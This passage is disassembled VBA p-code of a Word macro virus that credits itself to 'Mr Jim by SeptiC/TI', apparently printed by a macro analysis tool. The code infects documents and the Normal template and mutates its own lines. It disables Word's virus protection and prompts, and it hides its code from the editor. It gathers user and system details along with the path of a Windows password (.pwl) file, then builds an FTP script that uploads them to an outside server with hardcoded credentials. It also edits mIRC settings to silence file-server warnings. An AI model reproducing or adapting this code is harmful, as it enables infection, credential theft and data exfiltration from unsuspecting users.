' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #124:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set polyit 
' Line #126:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #127:
' 	Ld generation 
' 	LitDI2 0x0001 
' 	Add 
' 	St temp_number 
' Line #128:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #129:
' 	StartWithExpr 
' 	Ld polyit 
' 	MemLd CodeModule 
' 	With 
' Line #130:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #131:
' 	StartForVariable 
' 	Ld da_line 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0208 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #132:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #133:
' 	Ld da_line 
' 	LitDI2 0x0037 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo stealth_poly 
' 	EndIf 
' Line #134:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #135:
' 	Ld da_line 
' 	LitStr 0x0001 "'"
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #136:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #137:
' 	Label stealth_poly 
' Line #138:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #139:
' 	StartForVariable 
' 	Ld da_line 
' 	EndForVariable 
' 	NextVar 
' Line #140:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #141:
' 	LitDI2 0x012C 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #142:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #143:
' 	LitDI2 0x0148 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #144:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #145:
' 	LitDI2 0x0038 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #146:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #147:
' 	LitDI2 0x0044 
' 	LitStr 0x000C "generation ="
' 	Ld temp_number 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #148:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #149:
' 	EndWith 
' Line #150:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #152:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #153:
' 	Label infect_normal 
' Line #154:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #155:
' 	Ld normal_inf 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no_inf 
' 	EndIf 
' Line #156:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #157:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set a 
' Line #158:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #159:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set B 
' Line #160:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #161:
' 	LitDI2 0x0001 
' 	Ld B 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #162:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #163:
' 	SetStmt 
' 	Ld a 
' 	Set fix_lines_2 
' Line #164:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #165:
' 	StartWithExpr 
' 	Ld fix_lines_2 
' 	With 
' Line #166:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #167:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St code_2 
' Line #168:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #169:
' 	EndWith 
' Line #170:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #171:
' 	LitDI2 0x0001 
' 	Ld code_2 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #172:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #173:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set polyit 
' Line #174:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #175:
' 	LitDI2 0x0000 
' 	St da_lines 
' Line #176:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #177:
' 	StartWithExpr 
' 	Ld polyit 
' 	MemLd CodeModule 
' 	With 
' Line #178:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #179:
' 	StartForVariable 
' 	Ld da_line 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0208 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #180:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #181:
' 	Ld da_line 
' 	LitDI2 0x0037 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo stealth_poly_2 
' 	EndIf 
' Line #182:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #183:
' 	Ld da_line 
' 	LitStr 0x0001 "'"
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #184:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #185:
' 	Label stealth_poly_2 
' Line #186:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #187:
' 	StartForVariable 
' 	Ld da_line 
' 	EndForVariable 
' 	NextVar 
' Line #188:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #189:
' 	LitDI2 0x012C 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #190:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #191:
' 	LitDI2 0x0038 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #192:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #193:
' 	LitDI2 0x0148 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #194:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #195:
' 	EndWith 
' Line #196:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #197:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #198:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #199:
' 	Label no_inf 
' Line #200:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #201:
' 	LitStr 0x000D "c:\config.dll"
' 	ArgsLd Dir 0x0001 
' 	St check_it 
' Line #202:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #203:
' 	Ld check_it 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Host_infiltrated 
' 	EndIf 
' Line #204:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #205:
' 	Label collect_i 
' Line #206:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #207:
' 	Ld Application 
' 	MemLd UserName 
' 	St user_name 
' Line #208:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #209:
' 	Ld System 
' 	MemLd Application 
' 	St info_1 
' Line #210:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #211:
' 	Ld System 
' 	MemLd Country 
' 	St info_2 
' Line #212:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #213:
' 	Ld System 
' 	MemLd Creator 
' 	St info_3 
' Line #214:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #215:
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	St info_4 
' Line #216:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #217:
' 	Ld generation 
' 	St info_5 
' Line #218:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #219:
' 	Ld System 
' 	MemLd ProcessorType 
' 	St info_6 
' Line #220:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #221:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	St info_7 
' Line #222:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #223:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #224:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #225:
' 	LitStr 0x0006 "\*.pwl"
' 	MemStWith FileName 
' Line #226:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #227:
' 	Ld windir 
' 	MemStWith LookIn 
' Line #228:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #229:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #230:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #231:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #232:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #233:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #234:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #235:
' 	ArgsMemCallWith Execute 0x0000 
' Line #236:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #237:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St passfile 
' Line #238:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #239:
' 	EndWith 
' Line #240:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #241:
' 	LitStr 0x0003 "c:\"
' 	Ld user_name 
' 	Concat 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #242:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #243:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld passfile 
' 	PrintItemNL 
' Line #244:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #245:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "User Name: "
' 	PrintItemSemi 
' 	Ld user_name 
' 	PrintItemNL 
' Line #246:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #247:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Time Infected: "
' 	PrintItemSemi 
' 	Ld Time 
' 	PrintItemNL 
' Line #248:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #249:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Application : "
' 	PrintItemSemi 
' 	Ld info_1 
' 	PrintItemNL 
' Line #250:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #251:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Country code : "
' 	PrintItemSemi 
' 	Ld info_2 
' 	PrintItemNL 
' Line #252:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #253:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Creator : "
' 	PrintItemSemi 
' 	Ld info_3 
' 	PrintItemNL 
' Line #254:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #255:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Free DiskSpace : "
' 	PrintItemSemi 
' 	Ld info_4 
' 	PrintItemNL 
' Line #256:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #257:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Generation of virus : "
' 	PrintItemSemi 
' 	Ld info_5 
' 	PrintItemNL 
' Line #258:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #259:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Processor Type : "
' 	PrintItemSemi 
' 	Ld info_6 
' 	PrintItemNL 
' Line #260:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #261:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Operating system : "
' 	PrintItemSemi 
' 	Ld info_7 
' 	PrintItemNL 
' Line #262:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #263:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #264:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #265:
' 	LitStr 0x0003 "c:\"
' 	Ld user_name 
' 	Concat 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #266:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #267:
' 	LitStr 0x000C "c:\msdos.dll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #268:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "o ftp.fortunecity.com"
' 	PrintItemNL 
' Line #270:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "user mrseptic"
' 	PrintItemNL 
' Line #272:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "nofb666"
' 	PrintItemNL 
' Line #274:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #276:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #277:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "put "C:\"
' 	Ld user_name 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0005 ".dll""
' 	PrintItemNL 
' Line #278:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld passfile 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0001 """
' 	PrintItemNL 
' Line #280:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #281:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #282:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #283:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #284:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #285:
' 	LitStr 0x000C "c:\msdos.dll"
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #286:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #287:
' 	LitStr 0x000D "c:\config.dll"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #288:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #289:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "BIG as usual in the future"
' 	PrintItemNL 
' Line #290:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #291:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #292:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #293:
' 	Label Host_infiltrated 
' Line #294:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #295:
' 	Label end_open 
' Line #296:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #297:
' 	EndSub 
' Line #298:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #299:
' 	FuncDefn (Sub ToolsMacro())
' Line #300:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #301:
' 	OnError no_doc_stealth 
' Line #302:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #303:
' 	Ld ActiveDocument 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no_doc_stealth 
' 	EndIf 
' Line #304:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #305:
' 	Dim 
' 	VarDefn Act_doc (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Act_doc 
' Line #306:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #307:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set a 
' Line #308:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #309:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #310:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #311:
' 	LitVarSpecial (True)
' 	Ld Act_doc 
' 	MemSt Saved 
' Line #312:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #313:
' 	Label no_doc_stealth 
' Line #314:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #315:
' 	Dim 
' 	VarDefn Act_norm (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Act_norm 
' Line #316:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #317:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set B 
' Line #318:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #319:
' 	LitDI2 0x0001 
' 	Ld B 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #320:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #321:
' 	LitVarSpecial (True)
' 	Ld Act_norm 
' 	MemSt Saved 
' Line #322:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #323:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #324:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #325:
' 	EndSub 
' Line #326:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #327:
' 	FuncDefn (Private Sub Document_Close())
' Line #328:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #329:
' 	LitStr 0x000B "c:\_vac.txt"
' 	St check_vac 
' Line #330:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #331:
' 	Ld check_vac 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "I guess you have what it takes."
' 	Ld vbInformation 
' 	LitStr 0x0015 "[Mr Jim] By SeptiC/TI"
' 	ArgsCall MsgBox 0x0003 
' 	BoS 0x0000 
' 	GoTo the_end 
' 	EndIf 
' Line #332:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #333:
' 	OnError end_macro 
' Line #334:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #335:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #336:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #337:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #338:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #339:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #340:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #341:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #342:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #343:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #344:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #345:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #346:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #347:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St windir 
' Line #348:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #349:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St active_doc 
' Line #350:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #351:
' 	LitStr 0x0014 "c:\mirc32\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "c:\mirc32\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #352:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #353:
' 	LitStr 0x001E "c:\program~1\mirc32\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "c:\program~1\mirc32\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #354:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #355:
' 	LitStr 0x001C "c:\program\mirc32\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "c:\program\mirc32\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #356:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #357:
' 	LitStr 0x0012 "c:\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "c:\mirc\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #358:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #359:
' 	LitStr 0x001C "c:\program~1\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "c:\program~1\mirc\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #360:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #361:
' 	LitStr 0x001A "c:\program\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "c:\program\mirc\"
' 	St set_dir 
' 	BoS 0x0000 
' 	GoTo past_dir 
' 	EndIf 
' Line #362:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #363:
' 	GoTo Pegasus 
' Line #364:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #365:
' 	Label past_dir 
' Line #366:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #367:
' 	Ld set_dir 
' 	LitStr 0x0012 "c:\program\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x001A "C:\program\mirc32\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #368:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #369:
' 	Ld set_dir 
' 	LitStr 0x0012 "c:\program\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x001A "C:\program\mirc32\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #370:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #371:
' 	Ld set_dir 
' 	LitStr 0x000A "c:\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x0012 "c:\mirc32\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #372:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #373:
' 	Ld set_dir 
' 	LitStr 0x000A "c:\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x0012 "c:\mirc32\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #374:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #375:
' 	Ld set_dir 
' 	LitStr 0x0014 "c:\program~1\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x001C "c:\program~1\mirc32\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #376:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #377:
' 	Ld set_dir 
' 	LitStr 0x0014 "c:\program~1\mirc32\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x001C "c:\program~1\mirc32\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #378:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #379:
' 	Ld set_dir 
' 	LitStr 0x0010 "c:\program\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x0018 "C:\program\mirc\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #380:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #381:
' 	Ld set_dir 
' 	LitStr 0x0010 "c:\program\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x0018 "C:\program\mirc\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #382:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #383:
' 	Ld set_dir 
' 	LitStr 0x0008 "c:\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x0010 "c:\mirc\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #384:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #385:
' 	Ld set_dir 
' 	LitStr 0x0008 "c:\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
